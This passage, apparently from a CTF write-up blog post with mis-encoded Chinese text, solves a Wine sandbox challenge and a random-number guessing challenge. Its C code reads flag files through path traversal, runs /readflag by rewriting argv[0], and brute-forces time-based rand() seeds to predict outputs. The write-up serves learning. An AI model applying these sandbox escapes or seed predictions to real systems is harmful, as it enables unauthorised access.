<p>ç¬¬ä¸€ä¸ª flag ä½äº <code>/flag1</code> ï¼Œç›´æ¥ <code>freopen</code> æ‰“å¼€è¾“å‡ºï¼Œæ‹¿åˆ°ç¬¬ä¸€ä¸ª flag <code>flag{Surprise_you_can_directory_traversal_1n_WINE_...}</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span><span style="color:#f92672">**</span> argv)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">freopen</span>(<span style="color:#e6db74">&#34;/flag1&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span>, stdin);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span> c <span style="color:#f92672">=</span> <span style="color:#a6e22e">getchar</span>();
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">while</span> (c <span style="color:#f92672">!=</span> EOF)
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">putchar</span>(c);
</span></span><span style="display:flex;"><span>		c <span style="color:#f92672">=</span> <span style="color:#a6e22e">getchar</span>();
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>ç¬¬äºŒä¸ª flag ä½äº <code>/flag2</code> ï¼Œä½†è¦æ‰§è¡Œ <code>/readflag</code> æ‰èƒ½è¯»åˆ°ï¼Œå…ˆè¯•ä¸€ä¸‹ç›´æ¥è¯»ï¼Œè¾“å‡ºä¸ºç©ºï¼Œä½†æ˜¯æ²¡æœ‰æŠ¥é”™ã€‚</p>
<p>ç”¨ <code>access</code> æµ‹è¯•äº†ä¸€ä¸‹æ–‡ä»¶å­˜åœ¨çŠ¶æ€ä¸æƒé™ï¼Œå‘ç° <code>/flag2</code> <code>/readflag</code> éƒ½æ˜¯å¯è¯»ä¸”å¯æ‰§è¡Œï¼Œå¾ˆå¥‡æ€ªã€‚</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">test_file</span>(<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> str)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">access</span>(str, F_OK))
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;%s exist!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, str);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">access</span>(str, R_OK))
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;%s can read!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, str);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">access</span>(str, X_OK))
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;%s can exec!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, str);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>ç”¨äºŒè¿›åˆ¶æ–¹å¼è¯»å– <code>/flag2</code> è¾“å‡ºè¿˜æ˜¯ç©ºï¼Œæ€€ç–‘è¿™ä¸ªæ–‡ä»¶é‡Œæ ¹æœ¬æ²¡æœ‰ä¸œè¥¿ï¼Œç¬¬äºŒä¸ª flag æ˜¯å†™æ­»åœ¨ <code>/readflag</code> é‡Œé¢çš„ã€‚</p>
<p>é‚£å°±åªèƒ½å»çœ‹çœ‹ <code>/readflag</code> äº†ã€‚</p>
<p>æŒ‰äºŒè¿›åˆ¶æ ¼å¼è¾“å‡ºä¸€ä¸‹è¿™ä¸ªç¨‹åºï¼ŒæŠŠè¾“å‡ºç»“æœä¿å­˜åˆ°æœ¬åœ°ï¼Œä¿å­˜ä¸ºå¯æ‰§è¡Œæ–‡ä»¶æ‰§è¡Œä¸€ä¸‹ï¼Œç»“æœæŠ¥é”™æ— æ³•è¿è¡Œã€‚</p>
<p>æ¨æµ‹è¿™ä¸ªç¨‹åºæ¯”æä¾›çš„è¾“å‡ºé•¿åº¦æœ€å¤§å€¼è¦å¤§ï¼Œæ²¡æ³•å®Œæ•´è¾“å‡ºï¼Œè¿™æ¡è·¯èµ°ä¸é€šã€‚</p>
<p>æ—¢ç„¶ <code>/readflag</code> å¯æ‰§è¡Œï¼Œé‚£å°±ç”¨ <code>execl</code> æ‰§è¡Œè¯•ä¸€ä¸‹ï¼Œ</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">execl</span>(<span style="color:#e6db74">&#34;/readflag&#34;</span>, NULL);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (ret <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;%d: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, ret, <span style="color:#a6e22e">strerror</span>(errno));
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>ç»“æœè¾“å‡º <code>No such file or directory</code> ï¼ŒæŠŠåœ°å€æ¢æˆ <code>./readflag</code> <code>readflag</code> ç­‰ç­‰ï¼Œéƒ½æ‰¾ä¸åˆ°æ–‡ä»¶ã€‚</p>
<p>æä¸æ‡‚ <code>execl</code> çš„å¯»å€ç©¶ç«Ÿæ˜¯æ€ä¹ˆå›äº‹ï¼ˆä¹Ÿå¯èƒ½æ˜¯ Wine çš„é—®é¢˜ï¼Ÿï¼‰ï¼Œè¯•ç€è¾“å‡ºäº†ä¸€ä¸‹å½“å‰ç¨‹åºçš„è·¯å¾„ï¼Œ</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, argv[<span style="color:#ae81ff">0</span>]);
</span></span></code></pre></div><p>ç»“æœå‡ºæ¥äº† <code>\\?\unix\dev\shm\a.exe</code></p>
<p>é‰´äºåœ¨ç¨‹åºå†…å¯ä»¥ä½¿ç”¨ <code>access</code> æµ‹è¯•æ–‡ä»¶æƒé™ï¼Œæ¨æµ‹ <code>a.exe</code> å’Œ <code>readflag</code> ä½äºç›¸åŒç›®å½•ä¸‹ï¼Œå› æ­¤åšå¦‚ä¸‹ä¿®æ”¹</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span><span style="color:#f92672">**</span> argv)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	argv[<span style="color:#ae81ff">0</span>][<span style="color:#ae81ff">9</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;r&#39;</span>;
</span></span><span style="display:flex;"><span>	argv[<span style="color:#ae81ff">0</span>][<span style="color:#ae81ff">10</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;e&#39;</span>;
</span></span><span style="display:flex;"><span>	argv[<span style="color:#ae81ff">0</span>][<span style="color:#ae81ff">11</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;a&#39;</span>;
</span></span><span style="display:flex;"><span>	argv[<span style="color:#ae81ff">0</span>][<span style="color:#ae81ff">12</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;d&#39;</span>;
</span></span><span style="display:flex;"><span>	argv[<span style="color:#ae81ff">0</span>][<span style="color:#ae81ff">13</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;f&#39;</span>;
</span></span><span style="display:flex;"><span>	argv[<span style="color:#ae81ff">0</span>][<span style="color:#ae81ff">14</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;l&#39;</span>;
</span></span><span style="display:flex;"><span>	argv[<span style="color:#ae81ff">0</span>][<span style="color:#ae81ff">15</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;a&#39;</span>;
</span></span><span style="display:flex;"><span>	argv[<span style="color:#ae81ff">0</span>][<span style="color:#ae81ff">16</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;g&#39;</span>;
</span></span><span style="display:flex;"><span>	argv[<span style="color:#ae81ff">0</span>][<span style="color:#ae81ff">17</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">execl</span>(argv[<span style="color:#ae81ff">0</span>], NULL);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (ret <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;%d: %s&#34;</span>, ret, <span style="color:#a6e22e">strerror</span>(errno));
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>æˆåŠŸè¾“å‡º flag <code>flag{W1ne_is_NeveR_a_SaNDB0x_...}</code></p>
<p>çœ‹è¿™ä¸ªé¢˜è§£å‡ºæ¥çš„äººæ•°å¹¶ä¸å¤šï¼Œç”šè‡³è§£å‡ºç¬¬ä¸€é—®çš„äººæ•°æ¯”è§£å‡º Latex æœºå™¨äººç¬¬äºŒé—®çš„äººè¿˜å°‘ï¼Œ</p>
<p>å¯èƒ½å¤§å®¶éƒ½æ˜¯è¢«é¢˜é¢å“åˆ°äº†ç½¢ã€‚ã€‚ã€‚</p>
<h2 id="è’™ç‰¹å¡ç½—è½®ç›˜èµŒ">è’™ç‰¹å¡ç½—è½®ç›˜èµŒ</h2>
<p>åˆæ˜¯çŒœæ•°å­—ï¼Œå…ˆçœ‹çœ‹ä»£ç </p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">srand</span>((<span style="color:#66d9ef">unsigned</span>)<span style="color:#a6e22e">time</span>(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> <span style="color:#a6e22e">clock</span>());
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> j <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; j <span style="color:#f92672">&lt;</span> N; j<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">double</span> x <span style="color:#f92672">=</span> <span style="color:#a6e22e">rand01</span>();
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">double</span> y <span style="color:#f92672">=</span> <span style="color:#a6e22e">rand01</span>();
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (x<span style="color:#f92672">*</span>x <span style="color:#f92672">+</span> y<span style="color:#f92672">*</span>y <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">1</span>) M<span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>å¥½å®¶ä¼™ï¼Œç›´æ¥ä¸ç”¨ <code>SecureRandom</code> äº†ï¼ˆC åº”è¯¥ä¹Ÿæ²¡æœ‰è¿™ç©æ„ï¼‰ï¼Œé‚£è¿™ä¸ç›´æ¥é¢„æµ‹ä¸€æ‰‹ï¼Ÿ</p>
<p>æŸ¥äº†ä¸€ä¸‹ï¼Œ <code>rand</code> åº”è¯¥æ˜¯æœ‰å‘¨æœŸçš„ï¼Œè·‘ä¸€ä¸‹</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#define SEED_MAX RAND_MAX
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> map[SEED_MAX] <span style="color:#f92672">=</span> {};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> SEED_MAX; i<span style="color:#f92672">++</span>)
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">srand</span>(i);
</span></span><span style="display:flex;"><span>		map[i] <span style="color:#f92672">=</span> <span style="color:#a6e22e">rand</span>(i);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (i <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">&amp;&amp;</span> map[i] <span style="color:#f92672">==</span> map[<span style="color:#ae81ff">0</span>])
</span></span><span style="display:flex;"><span>		{
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;%d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, i);
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>è¾“å‡º <code>30103</code> ï¼Œå¾ˆå°ï¼Œåšä¸€ä¸ªç¨‹åºæŠŠæ‰€æœ‰æƒ…å†µè¾“å‡ºå°±å¥½äº†ã€‚</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#define SEED_MAX 30103
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">double</span> <span style="color:#a6e22e">rand01</span>()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> (<span style="color:#66d9ef">double</span>)<span style="color:#a6e22e">rand</span>() <span style="color:#f92672">/</span> RAND_MAX;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	FILE<span style="color:#f92672">*</span> f <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>(<span style="color:#e6db74">&#34;../ans.txt&#34;</span>, <span style="color:#e6db74">&#34;w&#34;</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> games <span style="color:#f92672">=</span> <span style="color:#ae81ff">5</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> SEED_MAX; i<span style="color:#f92672">++</span>)
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">srand</span>(i);
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;%d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, i);
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">fprintf</span>(f, <span style="color:#e6db74">&#34;%d: &#34;</span>, i);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> j <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; j <span style="color:#f92672">&lt;</span> games; j<span style="color:#f92672">++</span>)
</span></span><span style="display:flex;"><span>		{
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">int</span> M <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">int</span> N <span style="color:#f92672">=</span> <span style="color:#ae81ff">400000</span>;
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> k <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; k <span style="color:#f92672">&lt;</span> N; k<span style="color:#f92672">++</span>)
</span></span><span style="display:flex;"><span>			{
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">double</span> x <span style="color:#f92672">=</span> <span style="color:#a6e22e">rand01</span>();
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">double</span> y <span style="color:#f92672">=</span> <span style="color:#a6e22e">rand01</span>();
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">if</span> (x<span style="color:#f92672">*</span>x <span style="color:#f92672">+</span> y<span style="color:#f92672">*</span>y <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">1</span>) M<span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>			}
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">double</span> pi <span style="color:#f92672">=</span> (<span style="color:#66d9ef">double</span>)M <span style="color:#f92672">/</span> N <span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span>;
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">fprintf</span>(f, <span style="color:#e6db74">&#34;%1.5f &#34;</span>, pi);
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">fprintf</span>(f, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>è·‘äº†åå¤šåˆ†é’Ÿï¼Œå‡ºäº†æ‰€æœ‰ç»“æœï¼Œå¼€å¼€å¿ƒå¿ƒåœ°å»ç­”é¢˜ï¼Œç»“æœéšæœºæ•°åºåˆ—å…¨éƒ½å¯¹ä¸ä¸Šã€‚</p>
<p>éš¾é“æ˜¯ Debian:11 çš„ <code>rand</code> å’Œ Windows çš„ <code>rand</code> ä¸ä¸€æ ·ï¼Ÿ</p>
<p>äºæ˜¯ç¬”è€…åˆåºŸäº†è€å¤§åŠ²ï¼Œç»™è‡ªå·±çš„ Windows 10 å®¶åº­ç‰ˆè£…äº† Hyper-V å’Œ Docker ï¼Œè·‘äº†ä¸€ä¸‹ Debian:11 ã€‚</p>
<p>è¿™é‡Œä¸å¾—ä¸æä¸€å¥ï¼ŒJetBrains çœŸçš„å¥½ç”¨ï¼Œè£…å®Œ Docker ï¼Œæ¢å®Œæºï¼Œåªéœ€è¦åœ¨ Clion é‡Œç‚¹ä¸€ä¸‹è¿è¡Œï¼Œå‰©ä¸‹çš„åªéœ€è¦ç­‰ Dockerfile è‡ªå·±è·‘å®Œå°±è¡Œäº†ï¼ˆè²Œä¼¼ä¸ç”¨ IDE ä¹Ÿèƒ½åšåˆ°ï¼Œä½†æ˜¯ä¸å¬ï¼ŒJetBrains å°±æ˜¯å¥½ç”¨ï¼Œä¸æ¥å—åé©³ï¼‰ã€‚</p>
<p>åœ¨ Debian:11 é‡Œè¿è¡Œä¸Šé¢çš„æµ‹å‘¨æœŸçš„å‡½æ•°ï¼Œç»“æœè¾“å‡º <code>1</code> ã€‚</p>
<p>æœç„¶ï¼Œ<code>rand</code> åœ¨ä¸¤å¹³å°ä¸Šæ‰§è¡Œç»“æœæ˜¯ä¸ä¸€æ ·çš„ï¼Œè€Œä¸” <code>rand</code> åœ¨ Debian:11 ä¸Šç©¶ç«Ÿæœ‰æ²¡æœ‰å‘¨æœŸéƒ½éš¾è¯´ã€‚</p>
<p>è¾“å‡ºä¸€ä¸‹ <code>RAND_MAX</code> ç«Ÿç„¶æ˜¯ <code>0x7fffffff</code> ï¼Œè¿™ä¸‹æ— è®ºå¦‚ä½•éƒ½è·‘ä¸å®Œæ‰€æœ‰æƒ…å†µäº†ã€‚</p>
<p>é‡æ–°çœ‹çŒœæ•°å­—ç¨‹åºã€‚</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">srand</span>((<span style="color:#66d9ef">unsigned</span>)<span style="color:#a6e22e">time</span>(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> <span style="color:#a6e22e">clock</span>());
</span></span></code></pre></div><p><code>time(0)</code> æ˜¯ä» Unix æ ‡å‡†æ—¶é—´æˆ³åˆ°ç°åœ¨çš„æ—¶é—´ï¼Œè¿™ä¸ªåœ¨ä¸åŒæœºå™¨ä¸Šéƒ½ä¸€æ ·ï¼Œ<code>clock()</code> æ˜¯ç¨‹åºå¼€å§‹åˆ°æ‰§è¡Œè¿™æ¡è¯­å¥æ—¶çš„ç”¨æ—¶ï¼Œå•ä½æ˜¯æ¯«ç§’ï¼Œè¿™ä¸ªå€¼åº”è¯¥ä¸å¤§ã€‚</p>
<p>æ‰€ä»¥åªè¦è¾“å‡º <code>time(0)</code> é™„è¿‘çš„éšæœºæ•°ç§å­è·‘å‡ºæ¥çš„ç»“æœï¼Œå°±èƒ½é¢„æµ‹ç­”æ¡ˆäº†ã€‚</p>
<p>æŠŠä¸Šé¢çš„ç¨‹åºç¨ä½œä¿®æ”¹</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">double</span> <span style="color:#a6e22e">rand01</span>()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> (<span style="color:#66d9ef">double</span>)<span style="color:#a6e22e">rand</span>() <span style="color:#f92672">/</span> RAND_MAX;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	FILE<span style="color:#f92672">*</span> f <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>(<span style="color:#e6db74">&#34;../ans.txt&#34;</span>, <span style="color:#e6db74">&#34;w&#34;</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> games <span style="color:#f92672">=</span> <span style="color:#ae81ff">5</span>, SEED_MIN, SEED_MAX;
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Input seed min:&#34;</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">scanf</span>(<span style="color:#e6db74">&#34;%d&#34;</span>, <span style="color:#f92672">&amp;</span>SEED_MIN);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Input seed max:&#34;</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">scanf</span>(<span style="color:#e6db74">&#34;%d&#34;</span>, <span style="color:#f92672">&amp;</span>SEED_MAX);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> SEED_MIN; i <span style="color:#f92672">&lt;</span> SEED_MAX; i<span style="color:#f92672">++</span>)
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">srand</span>(i);
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;%d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, i);
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">fprintf</span>(f, <span style="color:#e6db74">&#34;%d: &#34;</span>, i);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> j <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; j <span style="color:#f92672">&lt;</span> games; j<span style="color:#f92672">++</span>)
</span></span><span style="display:flex;"><span>		{
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">int</span> M <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">int</span> N <span style="color:#f92672">=</span> <span style="color:#ae81ff">400000</span>;
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> k <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; k <span style="color:#f92672">&lt;</span> N; k<span style="color:#f92672">++</span>)
</span></span><span style="display:flex;"><span>			{
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">double</span> x <span style="color:#f92672">=</span> <span style="color:#a6e22e">rand01</span>();
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">double</span> y <span style="color:#f92672">=</span> <span style="color:#a6e22e">rand01</span>();
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">if</span> (x<span style="color:#f92672">*</span>x <span style="color:#f92672">+</span> y<span style="color:#f92672">*</span>y <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">1</span>) M<span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>			}
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">double</span> pi <span style="color:#f92672">=</span> (<span style="color:#66d9ef">double</span>)M <span style="color:#f92672">/</span> N <span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span>;
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">fprintf</span>(f, <span style="color:#e6db74">&#34;%1.5f &#34;</span>, pi);
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">fprintf</span>(f, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>è·‘äº†ä¸€ä¸‹ç§å­ <code>1666790000 ~ 1666799999</code> å†å»äº¤ï¼ŒæˆåŠŸé¢„æµ‹ï¼Œæ‹¿åˆ° flag ã€‚</p>
<h2 id="ç½®æ¢é­”ç¾¤">ç½®æ¢é­”ç¾¤</h2>
<p>å†™å®Œ WP ä¹‹åé—²ç€æ²¡äº‹åˆå»å¼€äº†ä¸¤é“æ•°å­¦é¢˜ã€‚</p>
